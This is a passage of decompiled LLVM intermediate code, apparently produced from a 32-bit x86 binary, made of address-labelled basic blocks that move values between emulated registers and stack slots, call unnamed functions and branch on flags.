dec_label_pc_8049562:                             ; preds = %dec_label_pc_8049550, %dec_label_pc_8049636, %dec_label_pc_80495dc
  %v0_8049562 = load i32, i32* @esp, align 4
  %v1_8049562 = add i32 %v0_8049562, 92
  %v2_8049562 = inttoptr i32 %v1_8049562 to i32*
  %v3_8049562 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049562, i32* %ecx.global-to-local, align 4
  %v1_8049566 = add i32 %v3_8049562, 12
  %v2_8049566 = inttoptr i32 %v1_8049566 to i32*
  %v3_8049566 = load i32, i32* %v2_8049566, align 4
  store i32 %v3_8049566, i32* %eax.global-to-local, align 4
  %v1_8049569 = icmp eq i32 %v3_8049566, 0
  store i1 %v1_8049569, i1* %zf.global-to-local, align 1
  %v1_804956b = icmp eq i1 %v1_8049569, false
  br i1 %v1_804956b, label %dec_label_pc_804958e, label %dec_label_pc_804956d

dec_label_pc_804956d:                             ; preds = %dec_label_pc_8049562
  %v1_804956d = add i32 %v3_8049562, 8
  %v2_804956d = inttoptr i32 %v1_804956d to i32*
  %v3_804956d = load i32, i32* %v2_804956d, align 4
  %v12_804956d = icmp eq i32 %v3_804956d, 1
  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_80530e3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp146 = icmp slt i32 %v3_80495d1, 1
  %tmp147 = icmp eq i1 %tmp146, false
  br i1 %tmp147, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_80530e3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_8052690()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_8052690()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_80554ba.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_8052690()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_8052690()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554a6.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_8052690()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_80554a9.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_8052690()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_80554a9.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_8052690()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_80526e0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
